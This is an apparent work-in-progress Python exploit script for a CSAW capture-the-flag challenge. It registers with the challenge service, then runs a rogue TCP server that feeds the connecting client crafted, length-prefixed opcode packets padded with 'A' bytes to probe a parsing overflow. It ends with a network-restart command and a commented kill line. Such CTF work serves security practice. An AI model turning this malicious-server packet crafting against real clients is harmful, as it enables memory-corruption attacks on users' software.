#!/usr/bin/env python
import SocketServer
from pwn import *
from sys import stdin, stdout
from struct import pack
from os import urandom, system
from time import *
THREADS = ord("c")

REMOTE_SERVER = "localhost"
REMOTE_PORT   = 24242


# REMOTE_SERVER = "pwn.chal.csaw.io"
# REMOTE_PORT   = 8004

SOCKET_SERVER = "0.0.0.0"
SOCKET_PORT   = 6000

numThreads = 1
thread = 0
threadList = [None for x in xrange(numThreads)]

def get_num(i):
    low = 251
    high = 255
    change = (high - low)/10.0
    n = low + int(i * change)
    return n

class TCPHandler(SocketServer.BaseRequestHandler):
    def userInput(self):
        stdout.write("\033[1;32mEnter Opcode> \033[0m")
        stdout.flush()

        uinput = stdin.readline()
        return uinput

    def serverResponse(self, response):
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response.encode('hex')))
        stdout.write("\033[1;36mServer Said: \033[39m{}\033[0m\n".format(response))
        stdout.flush()

    # def opcodeData(self, opcode):
    #     oplen = len(opcode)
    #     lenbytes = "0x84" + pack("<I", oplen)
    #     opdata = lenbytes + opcode

    #     return opdata

    def opcodeData(self, opcode):
        oplen = len(opcode)
        ret = ""
        if oplen < 126:
            return chr(oplen) + opcode
        else:
            packed = p32(oplen)
            num_nulls = packed.count('\x00')
            num_bytes = 4 - num_nulls
            m = 0x80
            m += num_bytes
            while packed[-1] == '\x00':
                packed = packed[:-1]
            print packed.encode('hex')
            print packed[num_nulls:].encode('hex')
            return chr(m) + packed[::-1] + opcode



    def phantomData(self, length):
        phBytes = urandom(length)
        return phBytes

    def generateResponse(self):
        # phBytes = self.phantomData(ord(urandom(1)))
        # opcodeData = self.opcodeData(self.userInput())
        # returnData = lengthPrefix + phBytes + opcodeData

        # lengthPrefix = pack("<HHI", 1, len(phBytes), len(opcodeData))
        # n = 121 + self.num
        # opcodeData = self.opcodeData("E{0}".format(n) + 'A'*n)
        # n = get_num(self.num)


        n = 10
        opcodeData = self.opcodeData("T" + 'A'*n)
        CD = 8
        EFGH = len(opcodeData)
        returnThing = "\x01\x00" # version 
        returnThing += p16(CD) 
        returnThing += p32(EFGH) 
        returnThing += "A" * CD
        returnThing += opcodeData
        print returnThing.encode('hex')

      # returnThing = "0100080003010000414141414141414181010145414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141".decode('hex')

      #   returnThing = "0100080011000000"+'A'.encode('hex')*8+"10454141414141414141414141414141"

        return returnThing

    def handle(self):
        global thread
        global threadList
        # self.num = thread
        # thread += 1
        # threadList[self.num] = self
        self.request.sendall(self.generateResponse())
        recieved = self.request.recv(1024)
        self.serverResponse(recieved)
        # self.response = recieved

# Create server and bind
server = SocketServer.ThreadingTCPServer(("0.0.0.0",SOCKET_PORT),TCPHandler)


# Initialise remote client
rmsrv = remote(REMOTE_SERVER, REMOTE_PORT)
clientData = pack("<HH", numThreads, SOCKET_PORT)
rmsrv.sendline(clientData)
rmsrv.close()

server.allow_reuse_address=True
# for x in range(numThreads):
try:
    server.serve_forever()
except:
    print 'fuck1'
    pass

# sleep(10)
# print threadList


# for l in threadList:
#     try:
#         print l.response
#     except:
#         print 'fuck2'
#         pass
server.server_close()



os.system("/etc/init.d/networking restart")
# os.system("netstat -pant | grep mom | grep 127 | cut -d\   -f 36 | sed 's/\/.*//g' | xargs kill -9")



print 












